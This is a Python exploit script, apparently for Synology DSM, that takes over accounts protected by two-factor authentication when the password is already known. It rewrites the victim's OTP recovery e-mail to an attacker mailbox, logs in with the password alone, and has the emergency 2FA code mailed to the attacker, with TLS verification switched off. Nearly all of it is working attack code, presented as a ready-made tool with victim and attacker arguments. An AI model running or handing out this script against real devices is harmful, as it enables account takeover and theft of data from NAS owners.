#!/usr/bin/env python3
"""
DSM two-factor authentication bypass.

The OTP recovery e-mail can be changed with the account password alone, so an attacker
who knows a victim's password redirects the emergency 2FA code to their own mailbox and
logs in. This script performs the first three requests, no session:

  1. otp.cgi action=saveMail   rewrite the recovery e-mail to an attacker address (root, password only).
  2. SYNO.API.Auth login       password only; returns "2FA required" and clears the gate on step 3.
  3. SYNO.Core.OTP.Mail send   mail the 6-digit emergency code to the attacker address.

Then log in normally with the victim's password and the 2FA code delivered to the
attacker mailbox.
"""
import argparse
import json
import ssl
import urllib.parse
import urllib.request

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE


def call(url, params, method="POST"):
    query = urllib.parse.urlencode(params)
    if method == "GET":
        req = urllib.request.Request(f"{url}?{query}", method="GET")
    else:
        req = urllib.request.Request(url, data=query.encode(), method="POST")
    with urllib.request.urlopen(req, context=ctx, timeout=30) as r:
        return json.loads(r.read().decode(errors="replace"))


def main():
    ap = argparse.ArgumentParser(description="DSM password-only 2FA account takeover")
    ap.add_argument("--url", required=True, help="DSM base URL, e.g. https://nas:5001")
    ap.add_argument("--victim-user", required=True, help="victim account name")
    ap.add_argument("--victim-password", required=True, help="victim account password")
    ap.add_argument("--attacker-mail", required=True, help="mailbox the attacker controls")
    args = ap.parse_args()
    base = args.url.rstrip("/")

    r1 = call(f"{base}/webapi/otp.cgi", {
        "api": "SYNO.API.OTP", "method": "setup", "version": "1",
        "username": args.victim_user, "passwd": args.victim_password,
        "action": "saveMail", "mail": args.attacker_mail,
    }, method="GET")
    print("[1] rewrite victim recovery e-mail:", json.dumps(r1))

    r2 = call(f"{base}/webapi/auth.cgi", {
        "api": "SYNO.API.Auth", "method": "login", "version": "6",
        "account": args.victim_user, "passwd": args.victim_password,
    })
    print("[2] password login, clears the emergency-code gate:", json.dumps(r2))

    r3 = call(f"{base}/webapi/entry.cgi", {
        "api": "SYNO.Core.OTP.Mail", "method": "send", "version": "1",
        "username": args.victim_user, "passwd": args.victim_password,
    })
    print("[3] mail emergency 2FA code to attacker:", json.dumps(r3))
    print(f"\nLog in with the victim's password and the 2FA code sent to {args.attacker_mail}.")


if __name__ == "__main__":
    main()
